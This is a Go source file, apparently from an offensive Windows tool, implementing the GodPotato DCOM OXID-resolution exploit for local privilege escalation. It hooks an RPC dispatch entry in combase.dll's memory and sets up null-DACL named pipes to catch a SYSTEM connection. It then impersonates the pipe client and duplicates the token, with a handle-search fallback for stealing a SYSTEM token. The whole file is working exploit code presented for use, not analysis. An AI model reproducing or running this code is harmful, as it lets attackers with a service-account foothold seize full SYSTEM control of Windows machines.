//go:build windows
// +build windows

// getsystem_potato.go contains the main GodPotato DCOM OXID resolution exploit.
// The exploit is split across several files for maintainability:
//   - getsystem_potato_types.go: type definitions, constants, globals, API procs
//   - getsystem_potato_hook.go:  RPC hook mechanics and shellcode generation
//   - getsystem_potato_oxid.go:  OXID extraction, COM objects, OBJREF crafting
//   - getsystem_potato_token.go: SYSTEM token search fallback (Win11 23H2+)

package main

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"runtime"
	"sync/atomic"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

func runDcomPotato(pipePrefix string) (windows.Token, error) {
	var phase int32
	resultCh := make(chan struct {
		tok windows.Token
		err error
	}, 1)

	go func() {
		tok, err := doPotatoExploit(pipePrefix, &phase)
		resultCh <- struct {
			tok windows.Token
			err error
		}{tok, err}
	}()

	select {
	case r := <-resultCh:
		return r.tok, r.err
	case <-time.After(25 * time.Second):
		return 0, fmt.Errorf("potato timeout phase=%d hook=%v pipe=%s",
			atomic.LoadInt32(&phase), potatoGlobal.hookCalled, potatoGlobal.pipeName)
	}
}

type potatoPipeSet struct {
	handles    []windows.Handle
	events     []windows.Handle
	overlapped []windows.Overlapped
}

func (ps *potatoPipeSet) close() {
	for i := range ps.handles {
		windows.CloseHandle(ps.events[i])
		windows.CloseHandle(ps.handles[i])
	}
}

func potatoCreatePipes(pipeName string) (*potatoPipeSet, error) {
	sd, err := windows.NewSecurityDescriptor()
	if err != nil {
		return nil, fmt.Errorf("NewSecurityDescriptor: %v", err)
	}
	if err := sd.SetDACL(nil, true, false); err != nil {
		return nil, fmt.Errorf("SetDACL: %v", err)
	}
	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		SecurityDescriptor: sd,
		InheritHandle:      0,
	}

	const n = 4
	ps := &potatoPipeSet{
		handles:    make([]windows.Handle, n),
		events:     make([]windows.Handle, n),
		overlapped: make([]windows.Overlapped, n),
	}
	pipeNamePtr, _ := windows.UTF16PtrFromString(pipeName)

	for i := 0; i < n; i++ {
		hPipe, _, pipeErr := procCreateNamedPipeW.Call(
			uintptr(unsafe.Pointer(pipeNamePtr)),
			PIPE_ACCESS_DUPLEX|FILE_FLAG_OVERLAPPED,
			0,
			PIPE_UNLIMITED_INSTANCES,
			PIPE_BUFFER_SIZE,
			PIPE_BUFFER_SIZE,
			0,
			uintptr(unsafe.Pointer(&sa)),
		)
		if hPipe == uintptr(windows.InvalidHandle) {
			for j := 0; j < i; j++ {
				windows.CloseHandle(ps.events[j])
				windows.CloseHandle(ps.handles[j])
			}
			return nil, fmt.Errorf("CreateNamedPipe[%d](%s): %v", i, pipeName, pipeErr)
		}
		evt, _ := windows.CreateEvent(nil, 1, 0, nil)
		ps.handles[i] = windows.Handle(hPipe)
		ps.events[i] = evt
		ps.overlapped[i].HEvent = evt
		procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&ps.overlapped[i])))
	}
	return ps, nil
}

type potatoCaptureResult struct {
	token    windows.Token
	identity string
	clients  []string
}

func potatoCaptureSystemToken(ps *potatoPipeSet, phase *int32) (*potatoCaptureResult, error) {
	atomic.StoreInt32(phase, 7)
	systemSID, _ := windows.StringToSid("S-1-5-18")
	result := &potatoCaptureResult{}

	deadline := time.Now().Add(15 * time.Second)
	for time.Now().Before(deadline) {
		windows.WaitForSingleObject(ps.events[0], 1000)

		for i := range ps.handles {
			wr, _ := windows.WaitForSingleObject(ps.events[i], 0)
			if wr != windows.WAIT_OBJECT_0 {
				continue
			}

			atomic.StoreInt32(phase, 8)
			hPipe := uintptr(ps.handles[i])

			ret, _, _ := procImpersonateNamedPipeClient.Call(hPipe)
			if ret == 0 {
				potatoResetPipe(ps, i)
				continue
			}

			var threadToken windows.Token
			err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &threadToken)
			if err != nil {
				err = windows.OpenThreadToken(windows.CurrentThread(), STEAL_TOKEN_ACCESS|TOKEN_QUERY, true, &threadToken)
			}
			if err != nil {
				procRevertToSelf.Call()
				potatoResetPipe(ps, i)
				continue
			}

			tokenUser, tuErr := threadToken.GetTokenUser()
			if tuErr != nil {
				threadToken.Close()
				procRevertToSelf.Call()
				potatoResetPipe(ps, i)
				continue
			}

			isSystem := tokenUser.User.Sid.Equals(systemSID)
			clientIdentity := clientLabel()
			result.clients = append(result.clients, clientIdentity)

			if !isSystem {
				searchTok, searchInfo, searchErr := searchSystemTokenViaHandles()
				threadToken.Close()
				procRevertToSelf.Call()
				procDisconnectNamedPipe.Call(hPipe)

				if searchErr == nil && searchTok != 0 {
					result.token = searchTok
					result.identity = fmt.Sprintf("token search: %s (pipe was %s)", searchInfo, clientIdentity)
					return result, nil
				}
				windows.ResetEvent(ps.events[i])
				procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&ps.overlapped[i])))
				continue
			}

			var dupToken windows.Token
			err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil,
				windows.SecurityDelegation, windows.TokenPrimary, &dupToken)
			if err != nil {
				err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil,
					windows.SecurityImpersonation, windows.TokenImpersonation, &dupToken)
			}
			threadToken.Close()
			procRevertToSelf.Call()
			procDisconnectNamedPipe.Call(hPipe)

			if err != nil {
				return nil, fmt.Errorf("connected as %s but token duplication failed: %v", clientIdentity, err)
			}

			result.token = dupToken
			result.identity = clientIdentity
			return result, nil
		}
	}
	return result, fmt.Errorf("no SYSTEM connection within 15s")
}

func potatoResetPipe(ps *potatoPipeSet, i int) {
	procDisconnectNamedPipe.Call(uintptr(ps.handles[i]))
	windows.ResetEvent(ps.events[i])
	procConnectNamedPipe.Call(uintptr(ps.handles[i]), uintptr(unsafe.Pointer(&ps.overlapped[i])))
}

func doPotatoExploit(pipePrefix string, phase *int32) (windows.Token, error) {
	atomic.StoreInt32(phase, 0)
	if !checkPrivilege("SeImpersonatePrivilege") {
		return 0, fmt.Errorf("SeImpersonatePrivilege not available")
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	if dcomVerbose() {
		fmt.Fprintln(os.Stderr, "[*] SysState/init (COM)")
	}
	atomic.StoreInt32(phase, 1)
	procCoInitializeEx.Call(0, 0)
	defer procCoUninitialize.Call()

	combaseBase, combaseSize, err := findModuleInfo("combase.dll")
	if err != nil {
		return 0, fmt.Errorf("combase: %w", err)
	}
	rpcIfaceAddr, err := scanForGUID(combaseBase, combaseSize, orcbGUID[:])
	if err != nil {
		return 0, fmt.Errorf("orcb scan: %w", err)
	}

	atomic.StoreInt32(phase, 2)
	rpcIface := (*rpcServerInterface)(unsafe.Pointer(rpcIfaceAddr))
	if rpcIface.DispatchTable == 0 {
		return 0, fmt.Errorf("dispatch table null")
	}
	dispTable := (*rpcDispatchTable)(unsafe.Pointer(rpcIface.DispatchTable))
	if dispTable.DispatchTable == 0 || dispTable.DispatchTableCount == 0 {
		return 0, fmt.Errorf("dispatch table empty")
	}
	midlInfo := (*midlServerInfo)(unsafe.Pointer(rpcIface.InterpreterInfo))
	if midlInfo == nil || midlInfo.DispatchTable == 0 {
		return 0, fmt.Errorf("midl dispatch null")
	}
	paramCount, paramErr := readUseProtSeqParamCount(midlInfo)
	if paramErr != nil {
		return 0, fmt.Errorf("param count: %w", paramErr)
	}
	potatoGlobal.paramCount = paramCount
	useProtSeqSlot := midlInfo.DispatchTable
	origFunc := *(*uintptr)(unsafe.Pointer(useProtSeqSlot))
	potatoGlobal.origFuncPtr = origFunc

	atomic.StoreInt32(phase, 3)
	oxid, oid, ipid, oxidErr := extractProcessOXID()
	if oxidErr != nil {
		return 0, fmt.Errorf("oxid: %w", oxidErr)
	}

	atomic.StoreInt32(phase, 4)
	pipeUniqueName := pipePrefix
	if pipeUniqueName == "" {
		var rndBytes [6]byte
		rand.Read(rndBytes[:])
		pipeUniqueName = hex.EncodeToString(rndBytes[:])
	}
	pipeName := fmt.Sprintf(`\\.\pipe\%s\pipe\epmapper`, pipeUniqueName)
	potatoGlobal.pipeName = pipeName
	potatoGlobal.pipeUniqueName = pipeUniqueName
	potatoGlobal.tokenCaptured = false
	potatoGlobal.systemToken = 0
	potatoGlobal.hookCalled = false
	potatoGlobal.precomputedDSA = buildPipeDSA(pipeUniqueName)

	pipes, pipeErr := potatoCreatePipes(pipeName)
	if pipeErr != nil {
		return 0, fmt.Errorf("pipes: %w", pipeErr)
	}
	defer pipes.close()

	atomic.StoreInt32(phase, 5)
	dsaBufAddr, dsaErr := allocateDSAOnHeap(potatoGlobal.precomputedDSA)
	if dsaErr != nil {
		return 0, fmt.Errorf("dsa: %w", dsaErr)
	}
	hookAddr, hookErr := buildNativeHook(paramCount, dsaBufAddr)
	if hookErr != nil {
		return 0, fmt.Errorf("hook: %w", hookErr)
	}

	var oldProtect uint32
	err = windows.VirtualProtect(useProtSeqSlot, unsafe.Sizeof(uintptr(0)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return 0, fmt.Errorf("virtualprotect: %w", err)
	}
	*(*uintptr)(unsafe.Pointer(useProtSeqSlot)) = hookAddr
	defer func() {
		*(*uintptr)(unsafe.Pointer(useProtSeqSlot)) = origFunc
		windows.VirtualProtect(useProtSeqSlot, unsafe.Sizeof(uintptr(0)), oldProtect, &oldProtect)
		if potatoGlobal.shellcodePage != 0 {
			windows.VirtualFree(potatoGlobal.shellcodePage, 0, windows.MEM_RELEASE)
			potatoGlobal.shellcodePage = 0
		}
	}()

	atomic.StoreInt32(phase, 6)
	triggerDone := make(chan error, 1)
	go func() {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		procCoInitializeEx.Call(0, 0)
		defer procCoUninitialize.Call()
		triggerDone <- triggerOXIDResolution(oxid, oid, ipid)
	}()
	var triggerErr error
	select {
	case triggerErr = <-triggerDone:
	case <-time.After(5 * time.Second):
		triggerErr = fmt.Errorf("com interface unmarshal blocked for >5s")
	}

	capture, captureErr := potatoCaptureSystemToken(pipes, phase)
	if captureErr != nil && (capture == nil || capture.token == 0) {
		return 0, potatoTimeoutError(pipeName, pipeUniqueName, paramCount, dsaBufAddr, oxid, oid, ipid, capture, triggerErr)
	}
	if capture == nil || capture.token == 0 {
		return 0, fmt.Errorf("no system token")
	}
	return capture.token, nil
}

func potatoTimeoutError(pipeName, pipeUniqueName string, paramCount int, dsaBufAddr uintptr, oxid, oid [8]byte, ipid [16]byte, capture *potatoCaptureResult, triggerErr error) error {
	hookStatus := "NOT called"
	if wasHookCalled() {
		hookStatus = "CALLED"
	}
	var clients []string
	if capture != nil {
		clients = capture.clients
	}
	bindingStr := "ncacn_np:localhost/pipe/" + pipeUniqueName + `[\pipe\epmapper]`
	errMsg := fmt.Sprintf("Did not receive SYSTEM connection (15s timeout).\nPipe: %s\nBinding: %s\nHook: %s (paramCount=%d, ppdsaIndex=%d)\nDSA size: %d bytes\nDSA addr: %x\nOXID: %x\nOID: %x\nIPID: %x\nClients seen: %v",
		pipeName, bindingStr, hookStatus, paramCount, paramCount-2, len(potatoGlobal.precomputedDSA),
		dsaBufAddr, oxid, oid, ipid, clients)
	if wasHookCalled() {
		diagParams := readDiagParams()
		errMsg += fmt.Sprintf("\nHook params: RCX=%x RDX=%x R8=%x R9=%x [RSP+0x28]=%x",
			diagParams[0], diagParams[1], diagParams[2], diagParams[3], diagParams[4])
	}
	if triggerErr != nil {
		errMsg += fmt.Sprintf("\nTrigger: %v", triggerErr)
	} else {
		errMsg += "\nTrigger: completed (no error)"
	}
	return fmt.Errorf("%s", errMsg)
}
